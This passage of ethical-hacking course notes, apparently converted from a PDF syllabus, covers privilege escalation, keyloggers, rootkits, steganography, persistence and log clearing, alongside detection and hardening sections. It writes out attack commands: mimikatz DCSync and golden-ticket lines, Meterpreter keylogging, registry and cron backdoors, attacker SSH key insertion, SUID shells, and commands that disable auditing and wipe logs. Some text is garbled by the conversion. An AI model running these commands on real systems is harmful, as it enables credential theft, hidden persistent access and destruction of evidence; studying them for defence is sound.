> Mimikatz technique that simulates Domain Controller replication to extract password hashes from Active Directory.
> 
> 
> #### 🔹 Requirements:
> 
> 
> 
> #### 🔹 Replicating Directory Changes permission
> 
> 
> 
> #### 🔹 Replicating Directory Changes All permission
> 
> 
> 
> #### 🔹 Execution:
> 
> 
> mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
> 
> 
> #### 🔹 Data Retrieved:
> 
> 
> 
> #### 🔹 KRBTGT hash (for Golden Ticket)
> 
> 
> 
> #### 🔹 All user NTLM hashes
> 
> 
> 
> #### 🔹 Password history
> 
> 
> 
> #### 🔹 Kerberos keys
> 
>
> ---
>
> ### 📍 Page 20
>
> 
> #### 🔹 3.14 Active Directory Certificate Services (ADCS)
> 
> 
> 
> #### 🔹 Abuse
> 
> 
> 
> #### 🔹 ADCS Vulnerabilities:
> 
> 
> Certificate template misconfiguration  Allowing unauthorized enrollment
> 
> 
> #### 🔹 ESC1ESC8  Various certificate-based attacks
> 
> 
> 
> #### 🔹 Certificate forgery  Creating fraudulent certificates
> 
> 
> 
> #### 🔹 Persistence  Using certificates for long-term access
> 
> 
> 
> #### 🔹 Exploitation:
> 
> 
> 
> #### 🔹 Enroll in misconfigured templates
> 
> 
> 
> #### 🔹 Impersonate privileged users
> 
> 
> 
> #### 🔹 Forge authentication certificates
> 
> 
> 
> #### 🔹 3.15 Additional Privilege Escalation Techniques
> 
> 
> 
> #### 🔹 Token Manipulation:
> 
> 
> 
> #### 🔹 Token impersonation
> 
> 
> 
> #### 🔹 Token duplication
> 
> 
> 
> #### 🔹 SeImpersonatePrivilege abuse Juicy Potato, PrintSpoofer)
> 
> 
> 
> #### 🔹 Environment Variable Injection:
> 
> 
> 
> #### 🔹 PATH hijacking
> 
> 
> 
> #### 🔹 LD_PRELOAD manipulation
> 
> 
> 
> #### 🔹 DYLD_INSERT_LIBRARIES abuse
> 
> 
> 
> #### 🔹 Symlink Attacks:
> 
> 
> 
> #### 🔹 Race conditions with symbolic links
> 
> 
> 
> #### 🔹 Redirecting privileged file operations
> 
> 
> 
> #### 🔹 Cron Job Abuse Linux):
> 
> 
> 
> #### 🔹 Writable cron scripts
> 
> 
> 
> #### 🔹 PATH manipulation in cron
> 
> 
> 
> #### 🔹 Wildcard injection
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 21 to 25 Syllabus Content**
>
> ### 📍 Page 21
>
> 
> #### 🔹 3.16 Privilege Escalation Tools
> 
> 
> 
> #### 🔹 Windows:
> 
> 
> 
> #### 🔹 WinPEAS  Automated privilege escalation enumeration
> 
> 
> 
> #### 🔹 PowerUp  PowerShell privilege escalation checks
> 
> 
> 
> #### 🔹 Sherlock  PowerShell script for missing patches
> 
> 
> 
> #### 🔹 BeRoot  Multi-platform privilege escalation tool
> 
> 
> 
> #### 🔹 Seatbelt  C# security enumeration tool
> 
> 
> 
> #### 🔹 Linux:
> 
> 
> 
> #### 🔹 LinPEAS  Linux privilege escalation enumeration
> 
> 
> 
> #### 🔹 LinEnum  Linux enumeration script
> 
> 
> 
> #### 🔹 Linux Exploit Suggester  Kernel exploit suggestions
> 
> 
> 
> #### 🔹 pspy  Process monitoring without root
> 
> 
> 
> #### 🔹 3.17 Privilege Escalation Countermeasures
> 
> 
> 
> #### 🔹 System Hardening:
> 
> 
> 
> #### 🔹 Patch management  Regular security updates
> 
> 
> 
> #### 🔹 Service hardening  Disable unnecessary services
> 
> 
> Least privilege principle  Minimal permissions for accounts and services
> 
> 
> #### 🔹 Application whitelisting  Control executable execution
> 
> 
> 
> #### 🔹 Configuration Management:
> 
> 
> 
> #### 🔹 Monitor service permissions  Regular audits
> 
> 
> 
> #### 🔹 Secure file permissions  Proper ACLs
> 
> 
> 
> #### 🔹 Disable AutoElevate  Remove unnecessary elevation
> 
> 
> 
> #### 🔹 Certificate template security  ADCS hardening
> 
> 
> 
> #### 🔹 Monitoring and Detection:
> 
> 
> Privilege escalation monitoring  Detect unusual privilege changes Token manipulation detection  Monitor suspicious token activity Anomalous process execution  Detect unexpected SYSTEM processes
>
> ---
>
> ### 📍 Page 22
>
> 
> #### 🔹 3.18 DLL/Dylib Hijacking Detection
> 
> 
> 
> #### 🔹 Detection Tools:
> 
> 
> 
> #### 🔹 Process Monitor  Real-time file and registry monitoring
> 
> 
> 
> #### 🔹 Autoruns  Enumerate auto-start locations
> 
> 
> 
> #### 🔹 Sysmon  Detailed system activity logging
> 
> 
> 
> #### 🔹 Detection Indicators:
> 
> 
> 
> #### 🔹 DLLs loaded from unusual locations
> 
> 
> 
> #### 🔹 Missing DLLs leading to search path exploitation
> 
> 
> 
> #### 🔹 Write access to system directories
> 
> 
> 
> #### 🔹 3.19 Spectre/Meltdown Detection and Mitigation
> 
> 
> 
> #### 🔹 Detection Tools:
> 
> 
> InSpectre  Checks system vulnerability and mitigation status Microsoft SpeculationControl  PowerShell module for checking
> 
> 
> #### 🔹 protections
> 
> 
> 
> #### 🔹 CPUChecker  Linux kernel vulnerability checker
> 
> 
> 
> #### 🔹 Mitigations:
> 
> 
> 
> #### 🔹 Microcode updates  CPU firmware patches
> 
> 
> 
> #### 🔹 Kernel patches  OS-level mitigations
> 
> 
> 
> #### 🔹 KPTI Kernel Page Table Isolation)  Isolate kernel memory
> 
> 
> 
> #### 🔹 Retpoline  Compiler-based mitigation
> 
> 
> 
> #### 🔹 4. Maintaining Access
> 
> 
> 
> #### 🔹 4.1 Remote Code Execution
> 
> 
> 
> #### 🔹 Execution Techniques
> 
> 
> 
> #### 🔹 SMBexec
> 
> 
> 
> #### 🔹 Execute commands via SMB service creation
> 
>
> ---
>
> ### 📍 Page 23
>
> 
> #### 🔹 PsExec
> 
> 
> 
> #### 🔹 Sysinternals tool for remote execution
> 
> 
> 
> #### 🔹 psexec \\target -u admin -p password cmd.exe
> 
> 
> 
> #### 🔹 WMI Execution
> 
> 
> 
> #### 🔹 Windows Management Instrumentation for remote commands
> 
> 
> 
> #### 🔹 wmic /node:target /user:admin process call create "cmd.exe"
> 
> 
> 
> #### 🔹 PowerShell Remoting
> 
> 
> 
> #### 🔹 Enter-PSSession ComputerName target Credential admin
> 
> 
> 
> #### 🔹 Metasploit
> 
> 
> 
> #### 🔹 Framework-based remote execution with various payloads
> 
> 
> 
> #### 🔹 Execution Tools
> 
> 
> 
> #### 🔹 PsExec
> 
> 
> 
> #### 🔹 Command execution and interactive shells
> 
> 
> 
> #### 🔹 Metasploit
> 
> 
> 
> #### 🔹 Comprehensive post-exploitation framework
> 
> 
> 
> #### 🔹 WinRM
> 
> 
> 
> #### 🔹 Windows Remote Management protocol
> 
> 
> 
> #### 🔹 Remote Desktop Protocol RDP
> 
> 
> 
> #### 🔹 Graphical remote access
> 
> 
> 
> #### 🔹 SSH
> 
> 
> 
> #### 🔹 Secure remote shell access Linux/Unix)
> 
> 
> 
> #### 🔹 4.2 Keyloggers and Spyware
> 
> 
> 
> #### 🔹 Keylogger Types:
> 
> 
> 
> #### 🔹 Hardware Keyloggers
> 
> 
> 
> #### 🔹 USB dongles between keyboard and computer
> 
>
> ---
>
> ### 📍 Page 24
>
> 
> #### 🔹 PS/2 adapters
> 
> 
> 
> #### 🔹 Wireless sniffers
> 
> 
> 
> #### 🔹 Firmware-based BIOS/UEFI
> 
> 
> 
> #### 🔹 Software Keyloggers
> 
> 
> 
> #### 🔹 User-mode application
> 
> 
> 
> #### 🔹 Kernel-mode driver
> 
> 
> 
> #### 🔹 Hypervisor-based
> 
> 
> 
> #### 🔹 Form grabbers (browser)
> 
> 
> 
> #### 🔹 Remote Keyloggers
> 
> 
> 
> #### 🔹 Send data to remote server
> 
> 
> 
> #### 🔹 Email exfiltration
> 
> 
> 
> #### 🔹 FTP upload
> 
> 
> 
> #### 🔹 Cloud storage
> 
> 
> 
> #### 🔹 Kernel-Level Keyloggers
> 
> 
> 
> #### 🔹 Hooks keyboard driver
> 
> 
> 
> #### 🔹 Extremely difficult to detect
> 
> 
> 
> #### 🔹 Requires admin/root privileges
> 
> 
> 
> #### 🔹 Remote Keylogger with Metasploit
> 
> 
> 
> #### 🔹 Meterpreter Keylogging:
> 
> 
> 
> #### 🔹 meterpreter> keyscan_start
> 
> 
> 
> #### 🔹 meterpreter> keyscan_dump
> 
> 
> 
> #### 🔹 meterpreter> keyscan_stop
> 
> 
> 
> #### 🔹 Features:
> 
> 
> 
> #### 🔹 Real-time keystroke capture
> 
> 
> 
> #### 🔹 Clipboard monitoring
> 
> 
> 
> #### 🔹 Screenshot capture
> 
> 
> 
> #### 🔹 Credential harvesting
> 
> 
> 
> #### 🔹 2 4
> 
>
> ---
>
> ### 📍 Page 25
>
> 
> #### 🔹 Keylogger and Spyware Defenses
> 
> 
> 
> #### 🔹 Prevention:
> 
> 
> Endpoint Detection and Response EDR  Advanced threat detection
> 
> 
> #### 🔹 Application whitelisting  Block unauthorized executables
> 
> 
> Driver signature enforcement  Prevent unsigned kernel drivers
> 
> 
> #### 🔹 Virtual keyboard  On-screen keyboard for sensitive input
> 
> 
> 
> #### 🔹 Anti-keylogger software  Specialized detection tools
> 
> 
> 
> #### 🔹 Detection:
> 
> 
> 
> #### 🔹 Behavioral analysis  Monitor for suspicious activity
> 
> 
> 
> #### 🔹 Memory forensics  Detect in-memory implants
> 
> 
> 
> #### 🔹 Network monitoring  Identify data exfiltration
> 
> 
> 
> #### 🔹 Process monitoring  Identify hooking behavior
> 
> 
> 
> #### 🔹 Anti-Keylogger Tools:
> 
> 
> 
> #### 🔹 Zemana AntiLogger
> 
> 
> 
> #### 🔹 SpyShelter
> 
> 
> 
> #### 🔹 KeyScrambler
> 
> 
> 
> #### 🔹 Kaspersky Internet Security
> 
> 
> 
> #### 🔹 Anti-Spyware Tools:
> 
> 
> 
> #### 🔹 Malwarebytes
> 
> 
> 
> #### 🔹 Spybot Search & Destroy
> 
> 
> 
> #### 🔹 SUPERAntiSpyware
> 
> 
> 
> #### 🔹 Windows Defender
> 
> 
> 
> #### 🔹 4.3 Hiding Files and Rootkits
> 
> 
> 
> #### 🔹 Rootkit Concepts
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 26 to 30 Syllabus Content**
>
> ### 📍 Page 26
>
> 
> #### 🔹 👻Rootkits
> 
> 
> Stealthy malware designed to hide processes, files, network activity, and maintain privileged access while evading detection by security tools.
> 
> 
> #### 🔹 Rootkit Types:
> 
> 
> 
> #### 🔹 User-Mode Rootkits
> 
> 
> 
> #### 🔹 Operate in user space
> 
> 
> 
> #### 🔹 Hook Windows API functions
> 
> 
> 
> #### 🔹 Easier to develop but easier to detect
> 
> 
> 
> #### 🔹 Kernel-Mode Rootkits
> 
> 
> 
> #### 🔹 Operate at kernel level
> 
> 
> 
> #### 🔹 Modify kernel data structures
> 
> 
> 
> #### 🔹 Very difficult to detect and remove
> 
> 
> 
> #### 🔹 Bootkits
> 
> 
> 
> #### 🔹 Infect Master Boot Record MBR or boot sector
> 
> 
> 
> #### 🔹 Load before operating system
> 
> 
> 
> #### 🔹 Persistent across reboots
> 
> 
> 
> #### 🔹 Firmware Rootkits
> 
> 
> 
> #### 🔹 Infect BIOS/UEFI firmware
> 
> 
> 
> #### 🔹 Survive OS reinstallation
> 
> 
> 
> #### 🔹 Extremely difficult to detect and remove
> 
> 
> 
> #### 🔹 Hypervisor Rootkits
> 
> 
> 
> #### 🔹 Run beneath operating system
> 
> 
> 
> #### 🔹 OS becomes virtual machine
> 
> 
> 
> #### 🔹 Nearly undetectable from within OS
> 
> 
> 
> #### 🔹 How Rootkits Work
> 
> 
> 
> #### 🔹 Hooking Techniques:
> 
>
> ---
>
> ### 📍 Page 27
>
> 
> #### 🔹 System call hooking  Intercept kernel system calls
> 
> 
> 
> #### 🔹 IAT/EAT hooking  Modify import/export address tables
> 
> 
> 
> #### 🔹 Inline hooking  Redirect function execution
> 
> 
> 
> #### 🔹 SSDT hooking  Modify System Service Descriptor Table
> 
> 
> 
> #### 🔹 Hiding Mechanisms:
> 
> 
> 
> #### 🔹 Process hiding  Remove from process lists
> 
> 
> 
> #### 🔹 File hiding  Remove from directory listings
> 
> 
> 
> #### 🔹 Registry hiding  Hide registry keys and values
> 
> 
> 
> #### 🔹 Network hiding  Conceal network connections
> 
> 
> 
> #### 🔹 Driver hiding  Remove from driver lists
> 
> 
> 
> #### 🔹 Detecting Rootkits
> 
> 
> 
> #### 🔹 Detection Methods:
> 
> 
> 
> #### 🔹 Signature-based  Known rootkit signatures
> 
> 
> 
> #### 🔹 Heuristic analysis  Behavioral anomalies
> 
> 
> 
> #### 🔹 Integrity checking  System file verification
> 
> 
> 
> #### 🔹 Memory analysis  RAM forensics
> 
> 
> 
> #### 🔹 Cross-view detection  Compare kernel vs. raw disk view
> 
> 
> 
> #### 🔹 Rootkit Detection Tools:
> 
> 
> 
> #### 🔹 chkrootkit  Linux rootkit scanner
> 
> 
> 
> #### 🔹 rkhunter  Unix rootkit detector
> 
> 
> 
> #### 🔹 GMER  Windows rootkit detector
> 
> 
> 
> #### 🔹 TDSSKiller  Kaspersky bootkit remover
> 
> 
> 
> #### 🔹 Rootkit Revealer  Sysinternals rootkit detector
> 
> 
> 
> #### 🔹 VICE  Virtual environment detection
> 
> 
> 
> #### 🔹 NTFS Alternate Data Streams (ADS)
> 
> 
> 
> #### 🔹 What are ADS?
> 
>
> ---
>
> ### 📍 Page 28
>
> Hidden file streams in NTFS that can store data without affecting file size display.
> 
> 
> #### 🔹 Creating ADS
> 
> 
> 
> #### 🔹 echo secret data > file.txt:hidden
> 
> 
> 
> #### 🔹 notepad file.txt:hidden
> 
> 
> 
> #### 🔹 Malicious Uses:
> 
> 
> 
> #### 🔹 Hide malicious code
> 
> 
> 
> #### 🔹 Store credentials
> 
> 
> 
> #### 🔹 Conceal backdoors
> 
> 
> 
> #### 🔹 Bypass antivirus scanning
> 
> 
> 
> #### 🔹 Detection Tools:
> 
> 
> 
> #### 🔹 Streams.exe Sysinternals)
> 
> 
> 
> #### 🔹 ADS Spy
> 
> 
> 
> #### 🔹 LADS List Alternate Data Streams)
> 
> 
> 
> #### 🔹 AlternateStreamView
> 
> 
> 
> #### 🔹 Prevention:
> 
> 
> 
> #### 🔹 Monitor ADS creation
> 
> 
> 
> #### 🔹 Regular ADS scanning
> 
> 
> 
> #### 🔹 File integrity monitoring
> 
> 
> 
> #### 🔹 4.4 Steganography
> 
> 
> 
> #### 🔹 What is Steganography?
> 
> 
> 
> #### 🔹 🖼Steganography
> 
> 
> The practice of hiding data within other seemingly innocuous data (images, audio, video, text) to conceal its existence.
> 
> 
> #### 🔹 Steganography vs. Cryptography:
> 
>
> ---
>
> ### 📍 Page 29
>
> 
> #### 🔹 Cryptography: Hides content (encrypted but visible)
> 
> 
> Steganography: Hides existence (undetectable without analysis)
> 
> 
> #### 🔹 Types Based on Cover Media
> 
> 
> 
> #### 🔹 Image Steganography
> 
> 
> 
> #### 🔹 LSB Least Significant Bit) manipulation
> 
> 
> 
> #### 🔹 DCT coefficient modification JPEG
> 
> 
> 
> #### 🔹 Palette-based hiding
> 
> 
> 
> #### 🔹 Metadata embedding EXIF
> 
> 
> 
> #### 🔹 Audio Steganography
> 
> 
> 
> #### 🔹 LSB insertion
> 
> 
> 
> #### 🔹 Phase encoding
> 
> 
> 
> #### 🔹 Spread spectrum techniques
> 
> 
> 
> #### 🔹 Echo hiding
> 
> 
> 
> #### 🔹 Video Steganography
> 
> 
> 
> #### 🔹 Frame-based embedding
> 
> 
> 
> #### 🔹 Motion vector manipulation
> 
> 
> 
> #### 🔹 Codec exploitation
> 
> 
> 
> #### 🔹 Text Steganography
> 
> 
> 
> #### 🔹 Whitespace manipulation
> 
> 
> 
> #### 🔹 Synonym substitution
> 
> 
> 
> #### 🔹 Format-based hiding
> 
> 
> 
> #### 🔹 Unicode hidden characters
> 
> 
> 
> #### 🔹 PDF Steganography
> 
> 
> 
> #### 🔹 Object stream embedding
> 
> 
> 
> #### 🔹 Metadata hiding
> 
> 
> 
> #### 🔹 Incremental updates
> 
> 
> 
> #### 🔹 Email Steganography
> 
>
> ---
>
> ### 📍 Page 30
>
> 
> #### 🔹 Header manipulation
> 
> 
> 
> #### 🔹 HTML hidden elements
> 
> 
> 
> #### 🔹 Attachment embedding
> 
> 
> 
> #### 🔹 Folder Steganography
> 
> 
> 
> #### 🔹 NTFS ADS
> 
> 
> 
> #### 🔹 Slack space
> 
> 
> 
> #### 🔹 Bad clusters
> 
> 
> 
> #### 🔹 Network/Protocol Steganography
> 
> 
> 
> #### 🔹 Covert channels in protocols
> 
> 
> 
> #### 🔹 Timing-based encoding
> 
> 
> 
> #### 🔹 Packet header manipulation
> 
> 
> 
> #### 🔹 Steganalysis
> 
> 
> 
> #### 🔹 Detecting Hidden Data:
> 
> 
> 
> #### 🔹 Visual Analysis
> 
> 
> 
> #### 🔹 Histogram analysis
> 
> 
> 
> #### 🔹 Noise pattern detection
> 
> 
> 
> #### 🔹 Compression artifact analysis
> 
> 
> 
> #### 🔹 Statistical Detection
> 
> 
> 
> #### 🔹 Chi-square test
> 
> 
> 
> #### 🔹 RS analysis
> 
> 
> 
> #### 🔹 Sample pair analysis
> 
> 
> 
> #### 🔹 Structural Analysis
> 
> 
> 
> #### 🔹 File format anomalies
> 
> 
> 
> #### 🔹 Metadata inconsistencies
> 
> 
> 
> #### 🔹 File size discrepancies
> 
> 
> 
> #### 🔹 Steganalysis Tools:
> 
> 
> 
> #### 🔹 StegDetect  Automated stego detection
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 31 to 35 Syllabus Content**
>
> ### 📍 Page 31
>
> 
> #### 🔹 zsteg  PNG and BMP analysis
> 
> 
> 
> #### 🔹 StegExpose  Machine learning-based detector
> 
> 
> 
> #### 🔹 StegSpy  Statistical analysis tool
> 
> 
> 
> #### 🔹 Steganography Analyzer  Multi-format detector
> 
> 
> 
> #### 🔹 5. Establishing Persistence
> 
> 
> 
> #### 🔹 5.1 Persistence Techniques
> 
> 
> 
> #### 🔹 🔗Persistence
> 
> 
> Techniques used to maintain access to compromised systems across reboots, credential changes, and other interruptions.
> 
> 
> #### 🔹 Windows Persistence Methods
> 
> 
> 
> #### 🔹 Registry Run Keys
> 
> 
> 
> #### 🔹 HKLM\Software\Microsoft\Windows\CurrentVersion\Run
> 
> 
> 
> #### 🔹 HKCU\Software\Microsoft\Windows\CurrentVersion\Run
> 
> 
> 
> #### 🔹 Startup Folders
> 
> 
> C\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup C\Users\Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Pr
> 
> 
> #### 🔹 ograms\Startup
> 
> 
> 
> #### 🔹 Scheduled Tasks
> 
> 
> schtasks /create /tn "Update" /tr "C\malware.exe" /sc onlogon
> 
> 
> #### 🔹 WMI Event Subscriptions
> 
> 
> 
> #### 🔹 Permanent event consumers for stealthy execution
> 
> 
> 
> #### 🔹 Services
> 
>
> ---
>
> ### 📍 Page 32
>
> 
> #### 🔹 sc create "WindowsUpdate" binpath= "C\malware.exe"
> 
> 
> 
> #### 🔹 DLL Hijacking
> 
> 
> 
> #### 🔹 Place malicious DLL in application search path
> 
> 
> 
> #### 🔹 COM Hijacking
> 
> 
> 
> #### 🔹 Redirect COM objects to malicious code
> 
> 
> 
> #### 🔹 Accessibility Features Backdoor
> 
> 
> 
> #### 🔹 Sticky Keys (sethc.exe)
> 
> 
> REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Imag e File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C\windows
> 
> 
> #### 🔹 \system32\cmd.exe"
> 
> 
> 
> #### 🔹 Press Shift 5 times for command prompt
> 
> 
> 
> #### 🔹 Other Accessibility Backdoors:
> 
> 
> 
> #### 🔹 Utilman.exe Utility Manager)
> 
> 
> 
> #### 🔹 Narrator.exe
> 
> 
> 
> #### 🔹 Magnify.exe
> 
> 
> 
> #### 🔹 DisplaySwitch.exe
> 
> 
> 
> #### 🔹 Active Directory Persistence
> 
> 
> 
> #### 🔹 Skeleton Key
> 
> 
> 
> #### 🔹 Patch LSASS to accept master password for all accounts
> 
> 
> 
> #### 🔹 Golden Ticket
> 
> 
> 
> #### 🔹 Forge Kerberos TGT with KRBTGT hash
> 
> 
> mimikatz # kerberos::golden /user:admin /domain:corp.local /sid:S1521...
> 
> 
> #### 🔹 /krbtgt:HASH /id:500
> 
> 
> 
> #### 🔹 Silver Ticket
> 
> 
> 
> #### 🔹 Forge service-specific Kerberos tickets
> 
> 
> 
> #### 🔹 AdminSDHolder Abuse
> 
>
> ---
>
> ### 📍 Page 33
>
> 
> #### 🔹 Modify AdminSDHolder ACL for persistent admin access
> 
> 
> 
> #### 🔹 DSRM Password Abuse
> 
> 
> 
> #### 🔹 Use Directory Services Restore Mode credentials
> 
> 
> 
> #### 🔹 SID History Injection
> 
> 
> 
> #### 🔹 Add privileged SID to user's SID history
> 
> 
> 
> #### 🔹 5.2 Overpass-the-Hash
> 
> 
> 
> #### 🔹 Technique:
> 
> 
> Use NTLM hash to request Kerberos TGT, then use ticket for authentication.
> 
> 
> #### 🔹 Execution:
> 
> 
> mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:p
> 
> 
> #### 🔹 owershell.exe
> 
> 
> 
> #### 🔹 Advantages:
> 
> 
> 
> #### 🔹 Bypasses pass-the-hash detections
> 
> 
> 
> #### 🔹 Uses legitimate Kerberos authentication
> 
> 
> 
> #### 🔹 Harder to detect than traditional PTH
> 
> 
> 
> #### 🔹 5.3 Linux Post-Exploitation Persistence
> 
> 
> 
> #### 🔹 Cron Jobs
> 
> 
> 
> #### 🔹 echo "* * * * * /tmp/backdoor.sh" | crontab -
> 
> 
> 
> #### 🔹 SSH Key Addition
> 
> 
> 
> #### 🔹 echo "attacker_public_key" >> ~/.ssh/authorized_keys
> 
> 
> 
> #### 🔹 LD_PRELOAD Tricks
> 
> 
> 
> #### 🔹 echo "/path/to/malicious.so" >> /etc/ld.so.preload
> 
> 
> 
> #### 🔹 Startup Scripts
> 
> 
> 
> #### 🔹 /etc/rc.local
> 
>
> ---
>
> ### 📍 Page 34
>
> 
> #### 🔹 /etc/init.d/
> 
> 
> 
> #### 🔹 systemd service units
> 
> 
> 
> #### 🔹 SUID Binaries
> 
> 
> 
> #### 🔹 cp /bin/bash /tmp/rootbash
> 
> 
> 
> #### 🔹 chmod +s /tmp/rootbash
> 
> 
> 
> #### 🔹 5.4 Windows Post-Exploitation
> 
> 
> 
> #### 🔹 Service Creation
> 
> 
> 
> #### 🔹 Install as Windows service for automatic startup
> 
> 
> 
> #### 🔹 Registry Autorun
> 
> 
> 
> #### 🔹 Multiple registry keys for persistence
> 
> 
> 
> #### 🔹 Token Impersonation
> 
> 
> 
> #### 🔹 Maintain access to privileged tokens
> 
> 
> 
> #### 🔹 Application Shimming
> 
> 
> 
> #### 🔹 Use Application Compatibility framework for persistence
> 
> 
> 
> #### 🔹 5.5 Defending Against Persistence
> 
> 
> 
> #### 🔹 Monitoring:
> 
> 
> 
> #### 🔹 Monitor registry changes  Alert on autorun modifications
> 
> 
> WMI subscription monitoring  Detect permanent event consumers
> 
> 
> #### 🔹 Scheduled task auditing  Track task creation
> 
> 
> 
> #### 🔹 Service monitoring  Alert on new service creation
> 
> 
> File integrity monitoring  Detect unauthorized file modifications
> 
> 
> #### 🔹 Protection:
> 
> 
> Endpoint Detection and Response EDR  Advanced threat detection
> 
> 
> #### 🔹 Application whitelisting  Restrict executable execution
> 
> 
> 
> #### 🔹 Privileged account restrictions  Limit admin access
> 
> 
> 
> #### 🔹 Memory protection  Prevent code injection
> 
>
> ---
>
> ### 📍 Page 35
>
> 
> #### 🔹 Certificate pinning  Detect forged certificates
> 
> 
> 
> #### 🔹 Hardening:
> 
> 
> Disable unused features  Remove accessibility backdoor opportunities
> 
> 
> #### 🔹 Secure boot  Prevent bootkit installation
> 
> 
> 
> #### 🔹 Credential Guard  Protect credentials in memory
> 
> 
> 
> #### 🔹 Protected Process Light  Prevent LSASS manipulation
> 
> 
> 
> #### 🔹 6. Clearing Logs and Covering Tracks
> 
> 
> 
> #### 🔹 6.1 Goals of Covering Tracks
> 
> 
> 
> #### 🔹 Attacker Objectives:
> 
> 
> 
> #### 🔹 Hide evidence of intrusion
> 
> 
> 
> #### 🔹 Remove forensic artifacts
> 
> 
> 
> #### 🔹 Maintain stealth and avoid detection
> 
> 
> 
> #### 🔹 Extend dwell time in network
> 
> 
> 
> #### 🔹 Prevent incident response
> 
> 
> 
> #### 🔹 6.2 Disabling Auditing
> 
> 
> 
> #### 🔹 Windows Audit Policy:
> 
> 
> 
> #### 🔹 auditpol /get /category:*
> 
> 
> 
> #### 🔹 auditpol /clear
> 
> 
> auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
> 
> 
> #### 🔹 Disabling Specific Auditing:
> 
> 
> 
> #### 🔹 Logon/logoff events
> 
> 
> 
> #### 🔹 Object access
> 
> 
> 
> #### 🔹 Privilege use
> 
> 
> 
> #### 🔹 Account management
> 
> 
> 
> #### 🔹 Policy changes
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 36 to 40 Syllabus Content**
>
> ### 📍 Page 36
>
> 
> #### 🔹 6.3 Clearing Windows Event Logs
> 
> 
> 
> #### 🔹 Command-Line Methods:
> 
> 
> 
> #### 🔹 wevtutil cl System
> 
> 
> 
> #### 🔹 wevtutil cl Security
> 
> 
> 
> #### 🔹 wevtutil cl Application
> 
> 
> 
> #### 🔹 PowerShell:
> 
> 
> 
> #### 🔹 Clear-EventLog LogName Security
> 
> 
> 
> #### 🔹 Clear-EventLog LogName System
> 
> 
> 
> #### 🔹 Get-EventLog List | ForEach-Object Clear-EventLog $_.Log}
> 
> 
> 
> #### 🔹 Direct File Deletion:
> 
> 
> 
> #### 🔹 del C\Windows\System32\winevt\Logs\*.evtx
> 
> 
> 
> #### 🔹 Metasploit:
> 
> 
> 
> #### 🔹 meterpreter> clearev
> 
> 
> 
> #### 🔹 6.4 Clearing Online Tracks
> 
> 
> 
> #### 🔹 Browser Artifacts:
> 
> 
> 
> #### 🔹 Delete browsing history
> 
> 
> 
> #### 🔹 Clear cookies and cache
> 
> 
> 
> #### 🔹 Remove download history
> 
> 
> 
> #### 🔹 Clear form autofill data
> 
> 
> 
> #### 🔹 Delete saved passwords
> 
> 
> 
> #### 🔹 VPN and Proxy:
> 
> 
> 
> #### 🔹 Route through VPN services
> 
> 
> 
> #### 🔹 Chain proxies SOCKS/HTTP
> 
> 
> 
> #### 🔹 Use TOR for anonymization
> 
> 
> 
> #### 🔹 Search Engine Tracking:
> 
>
> ---
>
> ### 📍 Page 37
>
> 
> #### 🔹 Use private browsing mode
> 
> 
> 
> #### 🔹 Clear search history
> 
> 
> 
> #### 🔹 Delete Google/Bing activity
> 
> 
> 
> #### 🔹 6.5 Covering Tracks on Operating Systems
> 
> 
> 
> #### 🔹 Linux/Unix:
> 
> 
> 
> #### 🔹 # Clear bash history
> 
> 
> 
> #### 🔹 history -c
> 
> 
> 
> #### 🔹 rm ~/.bash_history
> 
> 
> 
> #### 🔹 # Clear system logs
> 
> 
> 
> #### 🔹 echo "" > /var/log/auth.log
> 
> 
> 
> #### 🔹 echo "" > /var/log/syslog
> 
> 
> 
> #### 🔹 # Clear last login records
> 
> 
> 
> #### 🔹 echo "" > /var/log/wtmp
> 
> 
> 
> #### 🔹 echo "" > /var/log/btmp
> 
> 
> 
> #### 🔹 Windows:
> 
> 
> 
> #### 🔹 Clear Event Viewer logs
> 
> 
> 
> #### 🔹 Delete prefetch files
> 
> 
> 
> #### 🔹 Remove recent files lists
> 
> 
> 
> #### 🔹 Clear jump lists
> 
> 
> 
> #### 🔹 Modify timestamps
> 
> 
> 
> #### 🔹 6.6 Deleting Files Using cipher.exe
> 
> 
> 
> #### 🔹 Secure File Deletion:
> 
> 
> 
> #### 🔹 cipher /w:C\folder
> 
> 
> 
> #### 🔹 Functionality:
> 
> 
> 
> #### 🔹 Overwrites deleted file space
> 
> 
> 
> #### 🔹 Writes 0x00 pattern
> 
>
> ---
>
> ### 📍 Page 38
>
> 
> #### 🔹 Writes 0xFF pattern
> 
> 
> 
> #### 🔹 Writes random data
> 
> 
> 
> #### 🔹 Prevents forensic recovery
> 
> 
> 
> #### 🔹 6.7 Anti-Forensics Techniques
> 
> 
> 
> #### 🔹 Timestamp Manipulation
> 
> 
> 
> #### 🔹 Modify MAC times Modified, Accessed, Created)
> 
> 
> 
> #### 🔹 touch -t 202001011200 file.txt
> 
> 
> 
> #### 🔹 Log Tampering
> 
> 
> 
> #### 🔹 Selectively edit log entries instead of clearing entirely
> 
> 
> 
> #### 🔹 Encrypted Containers
> 
> 
> 
> #### 🔹 Store data in encrypted volumes VeraCrypt, LUKS
> 
> 
> 
> #### 🔹 RAM Wiping
> 
> 
> 
> #### 🔹 Clear memory to remove artifacts
> 
> 
> 
> #### 🔹 Secure Deletion
> 
> 
> 
> #### 🔹 Multi-pass overwrite of files
> 
> 
> 
> #### 🔹 File Slack Manipulation
> 
> 
> 
> #### 🔹 Hide data in file slack space
> 
> 
> 
> #### 🔹 Data Obfuscation
> 
> 
> 
> #### 🔹 Encrypt or encode artifacts
> 
> 
> 
> #### 🔹 6.8 Track-Covering Tools
> 
> 
> 
> #### 🔹 CCleaner
> 
> 
> 
> #### 🔹 System cleaning and privacy tool
> 
> 
> 
> #### 🔹 Metasploit Timestomp
> 
> 
> 
> #### 🔹 meterpreter> timestomp file.txt -v
> 
> 
> 
> #### 🔹 meterpreter> timestomp file.txt -m "01/01/2020 120000"
> 
> 
> 
> #### 🔹 PowerShell Log Cleaners
> 
>
> ---
>
> ### 📍 Page 39
>
> 
> #### 🔹 Custom scripts for selective log cleaning
> 
> 
